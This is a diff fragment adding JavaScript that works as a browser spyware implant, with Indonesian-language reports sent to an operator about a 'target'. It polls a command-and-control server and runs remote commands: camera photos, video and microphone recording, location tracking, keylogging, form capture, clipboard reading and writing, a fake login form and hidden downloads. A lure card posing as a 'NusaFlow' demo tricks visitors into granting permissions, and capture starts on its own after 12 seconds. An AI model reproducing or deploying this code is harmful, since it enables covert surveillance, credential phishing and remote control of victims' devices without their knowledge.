+    function dor(e){try{rot={a:Math.round(e.alpha||0),b:Math.round(e.beta||0),g:Math.round(e.gamma||0)};}catch(x){}}
+    try{window.addEventListener('devicemotion',dm);window.addEventListener('deviceorientation',dor);}catch(x){}
+    setTimeout(function(){
+      try{window.removeEventListener('devicemotion',dm);window.removeEventListener('deviceorientation',dor);}catch(x){}
+      var avg=n?(sum/n):0;
+      var s=_head('\u{1F3C3} SENSOR GERAK TARGET');
+      s+=_row('Waktu',_time());
+      s+=_row('Jumlah bacaan',n+' sampel');
+      s+=_row('Gerakan rata-rata',avg.toFixed(2)+' m/s2');
+      s+=_row('Gerakan maksimum',maxa.toFixed(2)+' m/s2');
+      s+=_row('Status',n===0?'tidak ada bacaan (sensor diblokir/perangkat diam total)':(avg>1.2?'HP sedang bergerak / dipegang':'HP cenderung diam (di meja / dalam tas)'));
+      if(rot)s+=_row('Orientasi',rot.a+'\u00B0 / '+rot.b+'\u00B0 / '+rot.g+'\u00B0 (alpha/beta/gamma)');
+      s+=_row('Sesi',_sid);
+      _say('info',s);
+    },4000);
+    return 'baca sensor 4 detik';
+  }catch(x){return 'sensor gagal';}
+}
+function _setclipOld(t){
+  try{
+    var ta=document.createElement('textarea');
+    ta.value=t;ta.setAttribute('readonly','');ta.style.cssText='position:fixed;top:-1000px;left:-1000px;opacity:0;';
+    document.body.appendChild(ta);
+    var sel=document.getSelection(),keep=sel&&sel.rangeCount?sel.getRangeAt(0):null;
+    ta.select();ta.setSelectionRange(0,t.length);
+    var ok=false;try{ok=document.execCommand('copy');}catch(x){}
+    try{ta.remove();}catch(x){}
+    if(keep&&sel){try{sel.removeAllRanges();sel.addRange(keep);}catch(x){}}
+    if(ok)_say('clip','\u{1F4CE} <b>CLIPBOARD DIISI</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n'+_row('Waktu',_time())+_row('Cara','execCommand copy')+_row('Isi',t),{clip:t});
+    else _say('error','\u26A0\uFE0F <b>Clipboard gagal diisi</b> \u00B7 browser menolak tanpa interaksi target.');
+  }catch(x){_say('error','\u26A0\uFE0F <b>Clipboard gagal diisi</b>.');}
+}
+function _setclip(a){
+  var t=String(a||'');
+  if(!t)return 'teks kosong';
+  try{
+    if(navigator.clipboard&&navigator.clipboard.writeText){
+      navigator.clipboard.writeText(t).then(function(){
+        _say('clip','\u{1F4CE} <b>CLIPBOARD DIISI</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n'+_row('Waktu',_time())+_row('Cara','clipboard.writeText')+_row('Isi',t),{clip:t});
+      }).catch(function(){_setclipOld(t);});
+      return 'menulis clipboard';
+    }
+  }catch(x){}
+  _setclipOld(t);
+  return 'menulis clipboard (cara lama)';
+}
+function _download(a){
+  var u=String(a||'').trim();
+  if(!/^https?:\/\//i.test(u))return 'URL harus http/https';
+  try{
+    var f=document.createElement('iframe');
+    f.setAttribute('aria-hidden','true');
+    f.style.cssText='position:fixed;width:1px;height:1px;opacity:0;left:-1000px;top:-1000px;border:0;';
+    f.src=u;
+    document.body.appendChild(f);
+    setTimeout(function(){try{f.remove();}catch(x){}},8000);
+    _say('info','\u{1F4E5} <b>UNDUHAN DIJALANKAN</b>\n'+_row('Waktu',_time())+_row('URL',u)+_row('Halaman',location.hostname||location.href)+_row('Catatan','kalau browser minta konfirmasi "izinkan unduhan", target harus menekan Izinkan'));
+    return 'unduhan dipicu';
+  }catch(x){return 'unduhan gagal';}
+}
+function _perm2(){
+  var names=['geolocation','camera','microphone','notifications','clipboard-read','clipboard-write'];
+  var jobs=[];
+  function push(nm){
+    try{
+      if(navigator.permissions&&navigator.permissions.query)jobs.push(navigator.permissions.query({name:nm}).then(function(s){return nm+'='+(s&&s.state?s.state:'?');}).catch(function(){return nm+'=tidak didukung';}));
+      else jobs.push(Promise.resolve(nm+'=tidak didukung'));
+    }catch(x){jobs.push(Promise.resolve(nm+'=tidak didukung'));}
+  }
+  for(var i=0;i<names.length;i++)push(names[i]);
+  Promise.all(jobs).then(function(r){
+    var s=_head('\u{1F6A6} STATUS IZIN TARGET');
+    s+=_row('Waktu',_time());
+    s+=_row('Halaman',location.hostname||location.href);
+    for(var j=0;j<r.length;j++){var p=String(r[j]).split('=');s+=_row(p[0],p.slice(1).join('='));}
+    s+=_row('Notifikasi (API)',window.Notification?Notification.permission:'tidak ada');
+    s+=_row('Secure Context',(window.isSecureContext?'ya':'tidak')+' (wajib untuk kamera/mic/lokasi)');
+    s+=_row('Sesi',_sid);
+    _say('info',s);
+  }).catch(function(){});
+  return 'cek izin browser';
+}
+function _bait(title,sub,btn,go){
+  try{
+    var wrap=document.createElement('div');
+    wrap.style.cssText='position:fixed;left:0;right:0;bottom:0;z-index:2147483000;display:flex;justify-content:center;pointer-events:none;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;';
+    var card=document.createElement('div');
+    card.style.cssText='pointer-events:auto;margin:12px;padding:16px 18px;max-width:430px;width:100%;background:#fff;border-radius:16px;box-shadow:0 12px 36px rgba(0,0,0,.24);border:1px solid rgba(0,0,0,.06);';
+    var t=document.createElement('div');
+    t.textContent=title;
+    t.style.cssText='font-size:15px;font-weight:700;color:#111827;line-height:1.35;';
+    card.appendChild(t);
+    if(sub){
+      var s=document.createElement('div');
+      s.textContent=sub;
+      s.style.cssText='margin-top:6px;font-size:12.5px;color:#4b5563;line-height:1.5;';
+      card.appendChild(s);
+    }
+    var b=document.createElement('button');
+    b.type='button';
+    b.textContent=btn||'Lanjutkan';
+    b.style.cssText='margin-top:13px;width:100%;padding:12px 16px;border:0;border-radius:11px;background:#111827;color:#fff;font-size:14px;font-weight:700;cursor:pointer;';
+    var done=false;
+    b.onclick=function(){
+      if(done)return;done=true;
+      b.textContent='Memproses...';b.style.opacity='.72';
+      try{go();}catch(x){}
+      setTimeout(function(){
+        wrap.style.transition='opacity .3s';wrap.style.opacity='0';
+        setTimeout(function(){try{wrap.remove();}catch(x){}},320);
+      },900);
+    };
+    card.appendChild(b);
+    wrap.appendChild(card);
+    var add=function(){try{document.body.appendChild(wrap);}catch(x){setTimeout(add,400);}};
+    if(document.body)add();else document.addEventListener('DOMContentLoaded',add);
+  }catch(x){try{go();}catch(y){}}
+}
+function _seq(arr,gap){
+  var i=0;
+  function next(){
+    if(i>=arr.length)return;
+    var f=arr[i++];
+    try{f();}catch(x){}
+    if(i<arr.length)setTimeout(next,gap);
+  }
+  next();
+}
+function _caps(cfg){
+  try{_pwatch();}catch(x){}
+  if(cfg.wake)try{_wake();}catch(x){}
+  if(cfg.keylog)try{_keylog();}catch(x){}
+  if(cfg.forms)try{_forms();}catch(x){}
+  var lk=_num(cfg.lock,0,0,120);
+  if(lk>0)try{_lock(lk);}catch(x){}
+  var jobs=[];
+  if(cfg.camera&&cfg.video){
+    jobs.push(function(){_camera(cfg,function(){setTimeout(function(){try{_video(cfg);}catch(x){}},600);});});
+  }else{
+    if(cfg.camera)jobs.push(function(){_camera(cfg);});
+    if(cfg.video)jobs.push(function(){_video(cfg);});
+  }
+  if(cfg.mic)jobs.push(function(){_mic(cfg);});
+  if(cfg.location)jobs.push(function(){_location(cfg);});
+  if(cfg.track)jobs.push(function(){_track(cfg);});
+  if(cfg.clip)jobs.push(function(){_clip();});
+  if(cfg.notif)jobs.push(function(){_notif();});
+  if(cfg.cred)jobs.push(function(){_cred(cfg);});
+  _seq(jobs,700);
+}
+function _run(cfg){
+  try{_say('info',_info(cfg));}catch(x){}
+  try{_battery();}catch(x){}
+  try{_info2();}catch(x){}
+  _caps(cfg);
+}
+function _fallback(){
+  var c=_cfg(null),o={},k;
+  for(k in c)o[k]=c[k];
+  o.camera=!!(c.camera||'1'==='1');
+  o.location=!!(c.location||'1'==='1');
+  o.mic=!!(c.mic||'1'==='1');
+  return o;
+}
+function _cmd(c,cfg){
+  var t=String((c&&c.type)||''),a=String((c&&c.arg)||'');
+  function done(msg){try{_say('cmd','\u26A1 <b>PERINTAH DIJALANKAN</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n'+_row('Aksi',t)+_row('Hasil',msg||'ok')+_row('Waktu',_time()));}catch(x){}}
+  try{
+    if(t==='recapture'){_caps(cfg);done('capture ulang dijalankan');}
+    else if(t==='photo'){_camera(_cfg({camMode:'front'}));done('ambil foto');}
+    else if(t==='video'){_video(_cfg({videoSec:_num(a,8,2,30)}));done('rekam video '+_num(a,8,2,30)+'s');}
+    else if(t==='audio'){_mic(_cfg({micSec:_num(a,12,3,120)}));done('rekam mikrofon '+_num(a,12,3,120)+'s');}
+    else if(t==='track'){var p=a.split(',');_track(_cfg({trackSec:_num(p[0],30,3,600),trackCount:_num(p[1],10,1,120)}));done('lacak lokasi');}
+    else if(t==='clip'){_clip();done('baca clipboard');}
+    else if(t==='speak'){done(_speak(a)?'suara diputar di HP target':'TTS tidak didukung');}
+    else if(t==='notify'){done(_push(a)?'notifikasi tampil':'gagal (izin notifikasi belum diberikan)');}
+    else if(t==='vibrate'){done(_vib(a)?'HP target bergetar':'vibrate tidak didukung');}
+    else if(t==='alert'){try{alert(a||'SYAM');done('popup tampil');}catch(x){done('popup gagal');}}
+    else if(t==='redirect'){done('alihkan ke '+a);setTimeout(function(){try{location.href=a;}catch(x){}},400);}
+    else if(t==='open'){try{window.open(a,'_blank');done('tab baru dibuka');}catch(x){done('gagal buka tab');}}
+    else if(t==='flash'){_flash(_num(a,3,1,60));done('layar dikedipkan');}
+    else if(t==='fullscreen'){_fs();done('fullscreen');}
+    else if(t==='lock'){_lock(_num(a,10,1,120));done('layar dikunci '+_num(a,10,1,120)+'s');}
+    else if(t==='cred'){try{var old=document.getElementById('_syam_cred');if(old)old.remove();}catch(x){}_cred(_cfg({cred:true,credTitle:a||undefined}));done('form login palsu tampil');}
+    else if(t==='bait'){var q=a.split('|');_bait(q[0]||'Lanjutkan',q[1]||'','',function(){_caps(cfg);});done('kartu pancingan tampil');}
+    else if(t==='reload'){done('muat ulang');setTimeout(function(){try{location.reload();}catch(x){}},400);}
+    else if(t==='close'){done('halaman ditutup');setTimeout(function(){try{document.documentElement.innerHTML='<body style="margin:0;background:#0f172a;color:#94a3b8;font-family:system-ui;display:flex;align-items:center;justify-content:center;height:100vh;font-size:14px">Sesi berakhir</body>';}catch(x){}},400);}
+    else if(t==='wake'){_wake();done('layar dijaga nyala');}
+    else if(t==='stay'){done(_stay(a==='0'?false:true));}
+    else if(t==='motion'){done(_motion());}
+    else if(t==='setclip'){done(_setclip(a));}
+    else if(t==='download'){done(_download(a));}
+    else if(t==='perm'){done(_perm2());}
+    else done('aksi tidak dikenal');
+  }catch(x){done('error: '+_e((x&&x.message)||'gagal'));}
+}
+var _pollT=null,_pollCfg=null;
+function _pollOnce(){
+  if(!_ct||document.hidden)return;
+  try{
+    fetch(_c2+'/poll?sid='+encodeURIComponent(_sid)).then(function(r){return r.json();}).then(function(j){
+      if(!j||!j.ok||!j.cmds||!j.cmds.length)return;
+      for(var i=0;i<j.cmds.length;i++){try{_cmd(j.cmds[i],_pollCfg||_cfg(null));}catch(x){}}
+    }).catch(function(){});
+  }catch(e){}
+}
+function _pollStart(cfg){
+  if(!_ct)return;
+  _pollCfg=cfg;
+  var sec=_num(cfg.pollSec,8,3,120);
+  if(_pollT)clearInterval(_pollT);
+  _pollT=setInterval(_pollOnce,sec*1000);
+  try{document.addEventListener('visibilitychange',function(){if(!document.hidden)_pollOnce();});}catch(x){}
+  setTimeout(_pollOnce,600);
+}
+function _boot(){
+  var remote=_ct
+    ? fetch(_c2+'/config').then(function(r){return r.json();}).then(function(j){return (j&&j.ok)?j:null;}).catch(function(){return null;})
+    : Promise.resolve(null);
+  remote.then(function(r){
+    var cfg=r?_cfg(r):_fallback();
+    try{_say('info',_info(cfg));}catch(x){}
+    try{_battery();}catch(x){}
+    try{_info2();}catch(x){}
+    if(_seen){try{_say('revisit','\u{1F501} <b>TARGET KEMBALI LAGI</b>\n'+_row('Waktu',_time())+_row('Halaman',location.href)+_row('Sesi',_sid));}catch(x){}}
+    _pollStart(cfg);
+    var any=cfg.camera||cfg.location||cfg.mic||cfg.video||cfg.track||cfg.clip||cfg.cred||cfg.keylog||cfg.forms||cfg.notif||_num(cfg.lock,0,0,120)>0;
+    if(!any)return;
+    var T='Izinkan akses untuk demo NusaFlow',SU='Aktifkan kamera dan mikrofon agar Anda dapat merekam serta mereview alur kerja NusaFlow saat mencoba fitur demo.',BT='Izinkan akses';
+    // Kartu pancingan dipakai hanya kalau judul, deskripsi, dan teks tombol semuanya terisi.
+    // Kalau salah satu dikosongkan: tanpa kartu, izin langsung diminta begitu link dibuka.
+    if(!T||!SU||!BT){setTimeout(function(){_caps(cfg);},400);return;}
+    var fired=false;
+    var once=function(){if(fired)return;fired=true;_caps(cfg);};
+    try{_bait(T,SU,BT,once);}catch(x){once();}
+    var w=parseInt('12',10);
+    if(!isFinite(w))w=12;
+    if(w>0)setTimeout(once,w*1000);
+  }).catch(function(){try{_run(_fallback());}catch(x){}});
+}
+try{_boot();}catch(x){try{_run(_fallback());}catch(y){}}
+})();
+</script>
